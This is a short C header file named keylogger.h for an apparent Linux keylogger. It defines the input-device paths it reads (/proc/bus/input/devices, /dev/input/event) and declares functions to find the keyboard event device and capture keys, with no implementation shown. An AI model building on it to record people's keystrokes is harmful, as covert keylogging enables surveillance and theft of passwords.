#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define GET_EVENT_PATH "/proc/bus/input/devices"
#define EVENT_PATH "/dev/input/event"
#define BUFF_LINE 128
#define BUFF_CHUNK 128 * 8
char get_event_num();

int capture_keys();
#endif //KEYLOGGER_H
